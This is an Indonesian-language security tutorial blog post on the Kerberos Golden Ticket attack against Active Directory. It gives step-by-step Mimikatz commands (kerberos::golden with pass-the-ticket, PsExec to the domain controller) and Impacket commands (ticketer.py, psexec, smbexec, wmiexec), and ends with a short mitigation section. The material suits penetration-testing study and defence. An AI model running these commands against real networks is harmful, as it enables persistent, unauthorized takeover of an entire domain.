---
title: Golden Ticket
date: 2022-03-09 23:11:22 +0700
categories: [Active Directory, Post Compromise Attack]
tags: [active directory, windows, golden ticket, impacket, mimikatz]     # TAG names should always be lowercase
author: nairpaa
---

**Golden Ticket** bekerja dengan cara memalsukan Kerberos ticket dengan mengkompromisasi akun **krbtgt** yang merupakan akun dari layanan Kerberos, yang bertanggung jawab untuk men-generate dan memvalidasi Kerberos ticket di Active Directory.

Setelah penyerang memperoleh hak akses ke Active Directory, ia dapat menggunakan Mimikatz untuk mengekstrak password hash akun **krbtgt**.

Selanjutnya masih menggunakan Mimikatz, penyerang men-generate **Golden Ticket**.

Setelah itu, penyerang akan melekukan *Pass-the-Ticket* (PtT) dan mendapatkan akses ke semua *resource* yang terhubung dengan AD.

### Tujuan 

- *Persistence*

### Prasyarat
- Mengetahui domain dan domain SID target
- Memiliki hash kredensial user **krbtgt**. Ini bisa dilakukan dengan beberapa cara:
	- Ekstrak **Ntds.dit**
	- Kompromisasi suatu komputer dan *dump* password
	- Eksploitasi **DCSync**   

### Tools

- Impacket
- Mimikatz

## Tahapan eksploitasi

### Via internal (Windows)

#### Step 1 - Persiapkan prasyarat

Domain SID: `S-1-5-21-2696008830-2827784344-2747163056`
```powershell
PS> whoami /user

USER INFORMATION
----------------

User Name SID
========= ==============================================
katuhu\ap S-1-5-21-2696008830-2827784344-2747163056-1105
```

#### Step 2 - Buat golden ticket

```powershell
# membuat golden ticket
mimikatz > kerberos::golden /domain:<domain> /sid:<sid> /id:500 /user:AingAdmin /krbtgt:<hash> /ptt

# membuka cmd dengan 
mimikatz > misc::cmd

# akses dc
PS> PsExec64.exe \\<hostname.domain.local> cmd
```

### Via remote (Kali)

```bash
# generate TGT dengan NTLM
➜ ticketer.py -nthash <krbtgt_ntlm_hash> -domain-sid <domain_sid> -domain <domain_name>  <user_name>

# generate TGT dengan AES key
➜ ticketer.py -aesKey <aes_key> -domain-sid <domain_sid> -domain <domain_name>  <user_name>

# setting ticket untuk impacket
➜ export KRB5CCNAME=<TGS_ccache_file>

# gunakan ticket pada impacket
➜ psexec.py <domain_name>/<user_name>@<remote_hostname> -k -no-pass
➜ smbexec.py <domain_name>/<user_name>@<remote_hostname> -k -no-pass
➜ wmiexec.py <domain_name>/<user_name>@<remote_hostname> -k -no-pass
```

## Migitagasi

Golden Ticket sangat sulit dideteksi karena merupakan TGT yang benar-benar valid. Namun, dalam banyak kasus, mereka dibuat dengan rentang masa aktif 10 tahun atau lebih, yang jauh melebihi nilai default di Active Directory. Sayangnya, event logs tidak mencatat TGT *timestamps* di log otentikasi tetapi produk monitoring AD dapat melakukannya. 

Hindari bocornya hash akun **krbtgt** dari penyerang dengan cara melindungi dari serangan **DCSync**, menghindari penggunaan domain admins pada komputer yang tidak memerlukan domain admins, dan lindungi file **Ntds.dit** jangan sampai penyerang mendapatkanya.

---

## Referensi
- https://blog.quest.com/golden-ticket-attacks-how-they-work-and-how-to-defend-against-them/
- https://stealthbits.com/blog/complete-domain-compromise-with-golden-tickets/
- https://decoder.cloud/2017/02/12/the-golden-solution/
- https://yojimbosecurity.ninja/golden-ticket-with-impacket/